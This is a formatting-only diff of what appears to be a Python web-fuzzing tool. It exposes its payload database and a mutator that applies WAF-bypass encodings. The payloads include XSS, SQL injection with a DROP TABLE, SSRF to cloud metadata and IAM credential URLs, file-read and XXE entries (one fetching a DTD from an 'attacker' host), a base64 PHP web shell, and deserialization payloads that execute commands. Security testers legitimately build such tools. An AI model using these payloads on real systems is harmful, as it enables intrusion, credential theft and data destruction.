@@ -51,7 +51,9 @@ class PayloadMutator:
         variants.append(MutationResult(payload=payload, techniques=["base"]))
 
         # URL-encode
-        variants.append(MutationResult(payload=urllib.parse.quote(payload, safe=""), techniques=["urlencode"]))
+        variants.append(
+            MutationResult(payload=urllib.parse.quote(payload, safe=""), techniques=["urlencode"])
+        )
 
         # Double URL-encode
         variants.append(
@@ -62,16 +64,28 @@ class PayloadMutator:
         )
 
         # Case toggle for keywords (simple)
-        variants.append(MutationResult(payload=self._case_toggle(payload), techniques=["case_toggle"]))
+        variants.append(
+            MutationResult(payload=self._case_toggle(payload), techniques=["case_toggle"])
+        )
 
         # Whitespace sprinkling
-        variants.append(MutationResult(payload=self._whitespace_sprinkle(payload), techniques=["whitespace_sprinkle"]))
+        variants.append(
+            MutationResult(
+                payload=self._whitespace_sprinkle(payload), techniques=["whitespace_sprinkle"]
+            )
+        )
 
         # Quote switching
-        variants.append(MutationResult(payload=payload.replace('"', "'").replace("'", '"'), techniques=["quote_switch"]))
+        variants.append(
+            MutationResult(
+                payload=payload.replace('"', "'").replace("'", '"'), techniques=["quote_switch"]
+            )
+        )
 
         # Random concatenation style (useful for some contexts)
-        variants.append(MutationResult(payload=self._concat_style(payload), techniques=["concat_style"]))
+        variants.append(
+            MutationResult(payload=self._concat_style(payload), techniques=["concat_style"])
+        )
 
         # De-dup and cap
         seen = set()
@@ -139,20 +153,30 @@ XSS_PAYLOADS: List[PayloadEntry] = [
     ("xss_data_uri", "xss", "data:text/html,<script>alert(1)</script>", ("attr", "href", "url")),
     ("xss_marquee", "xss", "<marquee onstart=alert(1)>", ("html", "body")),
     ("xss_style", "xss", "<style>@import 'javascript:alert(1)';</style>", ("html", "body")),
-    ("xss_meta_refresh", "xss", "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>", ("html", "head")),
+    (
+        "xss_meta_refresh",
+        "xss",
+        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+        ("html", "head"),
+    ),
     ("xss_attr_breakout_dq", "xss", '"><script>alert(1)</script>', ("attr", "double-quote")),
     ("xss_attr_breakout_sq", "xss", "'><script>alert(1)</script>", ("attr", "single-quote")),
     ("xss_attr_breakout_nq", "xss", " onmouseover=alert(1)", ("attr", "no-quote")),
     ("xss_template_lit", "xss", "${alert(1)}", ("template", "js")),
     ("xss_focused_event", "xss", "' autofocus onfocus=alert(1) x='", ("attr", "single-quote")),
-    ("xss_polyglot_html", "xss", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//", ("polyglot",)),
+    (
+        "xss_polyglot_html",
+        "xss",
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+        ("polyglot",),
+    ),
     ("xss_dom_location", "xss", "javascript:alert(document.cookie)", ("dom", "location")),
     ("xss_dom_eval", "xss", "eval('al'+'ert(1)')", ("dom", "eval")),
 ]
 
 SQLI_PAYLOADS: List[PayloadEntry] = [
     ("sqli_or_basic", "sqli", "' OR '1'='1", ("string", "single-quote")),
-    ("sqli_or_basic2", "sqli", "\" OR \"1\"=\"1", ("string", "double-quote")),
+    ("sqli_or_basic2", "sqli", '" OR "1"="1', ("string", "double-quote")),
     ("sqli_or_tautology_num", "sqli", "1 OR 1=1", ("numeric",)),
     ("sqli_union_select", "sqli", "' UNION SELECT NULL,NULL,NULL-- -", ("string", "union")),
     ("sqli_union_select_num", "sqli", "1 UNION SELECT NULL,NULL-- -", ("numeric", "union")),
@@ -161,8 +185,18 @@ SQLI_PAYLOADS: List[PayloadEntry] = [
     ("sqli_stacked_drop", "sqli", "1'; DROP TABLE users--", ("stacked", "mssql")),
     ("sqli_sleep_blind", "sqli", "1' AND SLEEP(5)-- -", ("blind", "time", "mysql")),
     ("sqli_pg_sleep", "sqli", "1'; SELECT pg_sleep(5)-- -", ("blind", "time", "postgres")),
-    ("sqli_benchmark", "sqli", "1' AND BENCHMARK(5000000,SHA1('a'))-- -", ("blind", "time", "mysql")),
-    ("sqli_if_error", "sqli", "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", ("error", "mysql")),
+    (
+        "sqli_benchmark",
+        "sqli",
+        "1' AND BENCHMARK(5000000,SHA1('a'))-- -",
+        ("blind", "time", "mysql"),
+    ),
+    (
+        "sqli_if_error",
+        "sqli",
+        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+        ("error", "mysql"),
+    ),
     ("sqli_order_by", "sqli", "1' ORDER BY 1-- -", ("string", "order-by")),
     ("sqli_offset", "sqli", "1' OFFSET 0-- -", ("string", "postgres")),
     ("sqli_ilike", "sqli", "1' ILIKE '%a%", ("string", "postgres")),
@@ -182,13 +216,48 @@ SSRF_PAYLOADS: List[PayloadEntry] = [
     ("ssrf_localhost", "ssrf", "http://127.0.0.1/", ("http", "url")),
     ("ssrf_localhost_alt", "ssrf", "http://localhost/", ("http", "url")),
     ("ssrf_zero_ip", "ssrf", "http://0/", ("http", "url", "waf-bypass")),
-    ("ssrf_aws_metadata", "ssrf", "http://169.254.169.254/latest/meta-data/", ("cloud", "aws", "metadata")),
-    ("ssrf_aws_metadata_v2", "ssrf", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ("cloud", "aws", "iam")),
-    ("ssrf_aws_token", "ssrf", "http://169.254.169.254/latest/api/token", ("cloud", "aws", "token")),
-    ("ssrf_gcp_metadata", "ssrf", "http://metadata.google.internal/computeMetadata/v1/", ("cloud", "gcp", "metadata")),
-    ("ssrf_azure_metadata", "ssrf", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ("cloud", "azure", "metadata")),
-    ("ssrf_digitalocean", "ssrf", "http://169.254.169.254/metadata/v1/", ("cloud", "digitalocean", "metadata")),
-    ("ssrf_openredirect", "ssrf", "https://example.com/redirect?url=http://169.254.169.254/", ("redirect",)),
+    (
+        "ssrf_aws_metadata",
+        "ssrf",
+        "http://169.254.169.254/latest/meta-data/",
+        ("cloud", "aws", "metadata"),
+    ),
+    (
+        "ssrf_aws_metadata_v2",
+        "ssrf",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        ("cloud", "aws", "iam"),
+    ),
+    (
+        "ssrf_aws_token",
+        "ssrf",
+        "http://169.254.169.254/latest/api/token",
+        ("cloud", "aws", "token"),
+    ),
+    (
+        "ssrf_gcp_metadata",
+        "ssrf",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        ("cloud", "gcp", "metadata"),
+    ),
+    (
+        "ssrf_azure_metadata",
+        "ssrf",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        ("cloud", "azure", "metadata"),
+    ),
+    (
+        "ssrf_digitalocean",
+        "ssrf",
+        "http://169.254.169.254/metadata/v1/",
+        ("cloud", "digitalocean", "metadata"),
+    ),
+    (
+        "ssrf_openredirect",
+        "ssrf",
+        "https://example.com/redirect?url=http://169.254.169.254/",
+        ("redirect",),
+    ),
     ("ssrf_file_proto", "ssrf", "file:///etc/passwd", ("file", "protocol")),
     ("ssrf_gopher", "ssrf", "gopher://127.0.0.1:6379/_FLUSHALL", ("gopher", "redis")),
     ("ssrf_dict", "ssrf", "dict://127.0.0.1:6379/INFO", ("dict", "redis")),
@@ -207,9 +276,19 @@ LFI_PAYLOADS: List[PayloadEntry] = [
     ("lfi_windows", "lfi", "..\\..\\..\\..\\windows\\win.ini", ("path", "windows")),
     ("lfi_proc_self", "lfi", "/proc/self/environ", ("path", "linux")),
     ("lfi_null_byte", "lfi", "../../../../etc/passwd%00", ("path", "null-byte", "old-php")),
-    ("lfi_php_filter", "lfi", "php://filter/convert.base64-encode/resource=index.php", ("php-filter",)),
+    (
+        "lfi_php_filter",
+        "lfi",
+        "php://filter/convert.base64-encode/resource=index.php",
+        ("php-filter",),
+    ),
     ("lfi_php_input", "lfi", "php://input", ("php-input",)),
-    ("lfi_data_uri", "lfi", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", ("data-uri", "php")),
+    (
+        "lfi_data_uri",
+        "lfi",
+        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
+        ("data-uri", "php"),
+    ),
     ("lfi_zip_wrapper", "lfi", "zip://shell.jpg%23payload.php", ("zip", "php")),
     ("lfi_phar_wrapper", "lfi", "phar://shell.jpg/payload.php", ("phar", "php")),
     ("lfi_double_dot", "lfi", "....//....//....//....//etc/passwd", ("path", "waf-bypass")),
@@ -236,11 +315,36 @@ RCE_PAYLOADS: List[PayloadEntry] = [
 ]
 
 XXE_PAYLOADS: List[PayloadEntry] = [
-    ("xxe_basic", "xxe", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', ("xml",)),
-    ("xxe_param", "xxe", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>', ("xml", "blind")),
-    ("xxe_php_expect", "xxe", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', ("xml", "php-expect")),
-    ("xxe_ssrf", "xxe", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>', ("xml", "ssrf")),
-    ("xxe_utf16", "xxe", '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', ("xml", "utf16")),
+    (
+        "xxe_basic",
+        "xxe",
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        ("xml",),
+    ),
+    (
+        "xxe_param",
+        "xxe",
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>',
+        ("xml", "blind"),
+    ),
+    (
+        "xxe_php_expect",
+        "xxe",
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
+        ("xml", "php-expect"),
+    ),
+    (
+        "xxe_ssrf",
+        "xxe",
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
+        ("xml", "ssrf"),
+    ),
+    (
+        "xxe_utf16",
+        "xxe",
+        '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        ("xml", "utf16"),
+    ),
 ]
 
 REDIR_PAYLOADS: List[PayloadEntry] = [
@@ -249,7 +353,12 @@ REDIR_PAYLOADS: List[PayloadEntry] = [
     ("redir_at", "redir", "https://victim.com@evil.com", ("url",)),
     ("redir_hash", "redir", "https://victim.com#@evil.com", ("url",)),
     ("redir_question", "redir", "https://victim.com?.evil.com", ("url",)),
-    ("redir_data", "redir", "data:text/html,<script>location='https://evil.com'</script>", ("url", "data")),
+    (
+        "redir_data",
+        "redir",
+        "data:text/html,<script>location='https://evil.com'</script>",
+        ("url", "data"),
+    ),
 ]
 
 CMD_INJ_PAYLOADS: List[PayloadEntry] = [
@@ -301,23 +410,53 @@ OPEN_REDIRECT_PAYLOADS: List[PayloadEntry] = [
     ("redir_query", "redir", "https://victim.com/?next=https://evil.com", ("url",)),
     ("redir_fragment", "redir", "https://victim.com#https://evil.com", ("url",)),
     ("redir_javascript_uri", "redir", "javascript:alert(document.domain)", ("url",)),
-    ("redir_data_uri", "redir", "data:text/html,<script>location='https://evil.com'</script>", ("url", "data")),
+    (
+        "redir_data_uri",
+        "redir",
+        "data:text/html,<script>location='https://evil.com'</script>",
+        ("url", "data"),
+    ),
     ("redir_whitespace", "redir", " //evil.com", ("url", "waf-bypass")),
     ("redir_tab_newline", "redir", "/\t/evil.com", ("url", "waf-bypass")),
 ]
 
 # More XSS
 XSS_EXTRA_PAYLOADS: List[PayloadEntry] = [
-    ("xss_anchor_click", "xss", "<a href=\"javascript:alert(1)\">click</a>", ("html", "anchor")),
-    ("xss_form_action", "xss", "<form action=\"javascript:alert(1)\"><input type=submit>", ("html", "form")),
-    ("xss_button_formaction", "xss", "<button formaction=\"javascript:alert(1)\">click</button>", ("html", "button")),
-    ("xss_object_flash", "xss", "<object type=\"application/x-shockwave-flash\" data=\"evil.swf\"></object>", ("html", "flash")),
+    ("xss_anchor_click", "xss", '<a href="javascript:alert(1)">click</a>', ("html", "anchor")),
+    (
+        "xss_form_action",
+        "xss",
+        '<form action="javascript:alert(1)"><input type=submit>',
+        ("html", "form"),
+    ),
+    (
+        "xss_button_formaction",
+        "xss",
+        '<button formaction="javascript:alert(1)">click</button>',
+        ("html", "button"),
+    ),
+    (
+        "xss_object_flash",
+        "xss",
+        '<object type="application/x-shockwave-flash" data="evil.swf"></object>',
+        ("html", "flash"),
+    ),
     ("xss_var_assign", "xss", "var a=1;alert(1)", ("js", "var")),
-    ("xss_dom_innerhtml", "xss", "document.body.innerHTML='<img src=x onerror=alert(1)>'", ("dom", "innerhtml")),
+    (
+        "xss_dom_innerhtml",
+        "xss",
+        "document.body.innerHTML='<img src=x onerror=alert(1)>'",
+        ("dom", "innerhtml"),
+    ),
     ("xss_outerhtml", "xss", "document.body.outerHTML=alert(1)", ("dom", "outerhtml")),
     ("xss_setTimeout_str", "xss", "setTimeout('alert(1)',0)", ("js", "timer")),
     ("xss_proto_pollution", "xss", "__proto__[innerHTML]=alert(1)", ("js", "prototype")),
-    ("xss_template_engine", "xss", "{{constructor.constructor('alert(1)')()}}", ("template", "angular")),
+    (
+        "xss_template_engine",
+        "xss",
+        "{{constructor.constructor('alert(1)')()}}",
+        ("template", "angular"),
+    ),
 ]
 
 # More SQLi
@@ -334,23 +473,43 @@ SQLI_EXTRA_PAYLOADS: List[PayloadEntry] = [
     ("sqli_or_true_tab", "sqli", "1'\tOR\t1=1-- -", ("string", "waf-bypass", "tab")),
     ("sqli_or_true_newline", "sqli", "1'\nOR\n1=1-- -", ("string", "waf-bypass", "newline")),
     ("sqli_or_true_cr", "sqli", "1'\rOR\r1=1-- -", ("string", "waf-bypass", "cr")),
-    ("sqli_json_path", "sqli", "{\"$gt\": \"\"}", ("nosql", "mongo")),
-    ("sqli_mongo_ne", "sqli", "{\"password\": {\"$ne\": null}}", ("nosql", "mongo")),
-    ("sqli_mongo_regex", "sqli", "{\"password\": {\"$regex\": \".*\"}}", ("nosql", "mongo")),
+    ("sqli_json_path", "sqli", '{"$gt": ""}', ("nosql", "mongo")),
+    ("sqli_mongo_ne", "sqli", '{"password": {"$ne": null}}', ("nosql", "mongo")),
+    ("sqli_mongo_regex", "sqli", '{"password": {"$regex": ".*"}}', ("nosql", "mongo")),
 ]
 
 # More SSRF
 SSRF_EXTRA_PAYLOADS: List[PayloadEntry] = [
-    ("ssrf_aws_user_data", "ssrf", "http://169.254.169.254/latest/user-data/", ("cloud", "aws", "userdata")),
-    ("ssrf_aws_iam_info", "ssrf", "http://169.254.169.254/latest/dynamic/instance-identity/document", ("cloud", "aws", "iam")),
+    (
+        "ssrf_aws_user_data",
+        "ssrf",
+        "http://169.254.169.254/latest/user-data/",
+        ("cloud", "aws", "userdata"),
+    ),
+    (
+        "ssrf_aws_iam_info",
+        "ssrf",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        ("cloud", "aws", "iam"),
+    ),
     ("ssrf_aws_network", "ssrf", "http://169.254.169.254/latest/network/", ("cloud", "aws")),
-    ("ssrf_aws_hostname", "ssrf", "http://169.254.169.254/latest/meta-data/hostname", ("cloud", "aws")),
+    (
+        "ssrf_aws_hostname",
+        "ssrf",
+        "http://169.254.169.254/latest/meta-data/hostname",
+        ("cloud", "aws"),
+    ),
     ("ssrf_alibaba", "ssrf", "http://100.100.100.200/latest/meta-data/", ("cloud", "alibaba")),
     ("ssrf_oracle_cloud", "ssrf", "http://192.0.0.192/latest/user-data/", ("cloud", "oracle")),
     ("ssrf_ecs_task", "ssrf", "http://169.254.170.2/v2/credentials/", ("cloud", "ecs")),
     ("ssrf_k8s_api", "ssrf", "https://kubernetes.default.svc/api/v1/namespaces", ("cloud", "k8s")),
     ("ssrf_k8s_secrets", "ssrf", "https://kubernetes.default.svc/api/v1/secrets", ("cloud", "k8s")),
-    ("ssrf_internal_scheme", "ssrf", "gopher://internal.svc:80/_GET /secret HTTP/1.0", ("gopher", "internal")),
+    (
+        "ssrf_internal_scheme",
+        "ssrf",
+        "gopher://internal.svc:80/_GET /secret HTTP/1.0",
+        ("gopher", "internal"),
+    ),
     ("ssrf_ftp", "ssrf", "ftp://127.0.0.1/", ("ftp",)),
     ("ssrf_tftp", "ssrf", "tftp://127.0.0.1/", ("tftp",)),
 ]
@@ -359,13 +518,23 @@ SSRF_EXTRA_PAYLOADS: List[PayloadEntry] = [
 SSTI_PAYLOADS: List[PayloadEntry] = [
     ("ssti_jinja_basic", "ssti", "{{7*7}}", ("template", "jinja", "python")),
     ("ssti_jinja_config", "ssti", "{{config}}", ("template", "jinja", "python")),
-    ("ssti_jinja_subprocess", "ssti", "{{''.__class__.__mro__[1].__subclasses__()}}", ("template", "jinja", "python")),
+    (
+        "ssti_jinja_subprocess",
+        "ssti",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        ("template", "jinja", "python"),
+    ),
     ("ssti_twig_basic", "ssti", "{{7*'7'}}", ("template", "twig", "php")),
     ("ssti_smarty_basic", "ssti", "{php}system('id');{/php}", ("template", "smarty", "php")),
     ("ssti_freemarker", "ssti", "${7*7}", ("template", "freemarker", "java")),
     ("ssti_velocity", "ssti", "#set($x=7*7)$x", ("template", "velocity", "java")),
     ("ssti_thymeleaf", "ssti", "${7*7}", ("template", "thymeleaf", "java")),
-    ("ssti_handlebars", "ssti", "{{#with \"s\" as |string|}}{{#with \"e\" as |enc|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{lookup string.sub \"constructor\"}} {{/with}}{{/with}}{{/with}}", ("template", "handlebars", "node")),
+    (
+        "ssti_handlebars",
+        "ssti",
+        '{{#with "s" as |string|}}{{#with "e" as |enc|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{lookup string.sub "constructor"}} {{/with}}{{/with}}{{/with}}',
+        ("template", "handlebars", "node"),
+    ),
     ("ssti_ejs_basic", "ssti", "<%= 7*7 %>", ("template", "ejs", "node")),
 ]
 
@@ -392,16 +561,36 @@ DESER_PAYLOADS: List[PayloadEntry] = [
     ("deser_java_basic", "deser", "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0", ("java", "base64")),
     ("deser_python_pickle", "deser", "cos\nsystem\n(S'id'\ntR.", ("python", "pickle")),
     ("deser_php_serial", "deser", 'O:8:"stdClass":0:{}', ("php", "serialize")),
-    ("deser_node_funcs", "deser", "{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()\"}", ("node", "node-serialize")),
+    (
+        "deser_node_funcs",
+        "deser",
+        "{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()\"}",
+        ("node", "node-serialize"),
+    ),
     ("deser_yaml_basic", "deser", "!!python/object/apply:os.system ['id']", ("python", "yaml")),
 ]
 
 # GraphQL
 GRAPHQL_PAYLOADS: List[PayloadEntry] = [
-    ("gql_introspection", "graphql", '{"query":"{ __schema { types { name } } }"}', ("introspection",)),
-    ("gql_alias", "graphql", '{"query":"{ user1: user(id:1) { name } user2: user(id:2) { name } }"}', ("alias",)),
+    (
+        "gql_introspection",
+        "graphql",
+        '{"query":"{ __schema { types { name } } }"}',
+        ("introspection",),
+    ),
+    (
+        "gql_alias",
+        "graphql",
+        '{"query":"{ user1: user(id:1) { name } user2: user(id:2) { name } }"}',
+        ("alias",),
+    ),
     ("gql_batching", "graphql", '[{"query":"mutation { login }"}]', ("batching",)),
-    ("gql_field_suggest", "graphql", '{"query":"{ usr { name } }"}', ("suggestion", "introspection")),
+    (
+        "gql_field_suggest",
+        "graphql",
+        '{"query":"{ usr { name } }"}',
+        ("suggestion", "introspection"),
+    ),
 ]
 
 
@@ -489,6 +678,7 @@ class PayloadDatabase:
 @dataclass
 class GrammarRule:
     """Single grammar rule: symbol -> list of expansions (each expansion is a list of tokens)."""
+
     expansions: List[List[str]]
 
 
@@ -583,7 +773,7 @@ def _build_json_grammar() -> Grammar:
     g.rule("<object>", [["{", "<pairs>", "}"]])
     g.rule("<pairs>", [[], ["<pair>"], ["<pair>,", "<pairs>"]])
     g.rule("<pair>", [['"a":', "<value>"]])
-    g.rule("<value>", [["1"], ["\"x\""], ["true"], ["null"], ["<object>"], ["<array>"]])
+    g.rule("<value>", [["1"], ['"x"'], ["true"], ["null"], ["<object>"], ["<array>"]])
     g.rule("<array>", [["[", "<items>", "]"]])
     g.rule("<items>", [[], ["<value>"], ["<value>,", "<items>"]])
     return g
@@ -593,7 +783,24 @@ def _build_xml_grammar() -> Grammar:
     g = Grammar()
     g.rule("<root>", [["<elem>"]])
     g.rule("<elem>", [["<tag>"], ["<doctype>", "<tag>"]])
-    g.rule("<doctype>", [[r"\@<!DOCTYPE", "foo", r"\@[", r"\@<!ENTITY", "xxe", "SYSTEM", r'\@"', "file:///etc/passwd", r'\@"', r"\@]", r"\@>"]])
+    g.rule(
+        "<doctype>",
+        [
+            [
+                r"\@<!DOCTYPE",
+                "foo",
+                r"\@[",
+                r"\@<!ENTITY",
+                "xxe",
+                "SYSTEM",
+                r'\@"',
+                "file:///etc/passwd",
+                r'\@"',
+                r"\@]",
+                r"\@>",
+            ]
+        ],
+    )
     g.rule("<tag>", [["<open_tag>", "<text>", "<close_tag>"]])
     # Emit literal "<foo>" using the \@ escape prefix
     g.rule("<open_tag>", [[r"\@<foo>"]])
@@ -650,6 +857,7 @@ class InjectionContext:
         transport: if applicable ("http", "xml", "json", "form").
         extra_filters: extra sink tags to include.
     """
+
     category: str
     sinks: List[str] = field(default_factory=list)
     quote_style: str = "none"
@@ -698,7 +906,9 @@ class ContextualMutator:
             # Take only first variant to keep result list bounded
             variants = mutator.mutate(p, max_variants=3)
             if variants:
-                out.append(MutationResult(payload=variants[0].payload, techniques=variants[0].techniques))
+                out.append(
+                    MutationResult(payload=variants[0].payload, techniques=variants[0].techniques)
+                )
         rnd.shuffle(out)
         return out[:n]
 
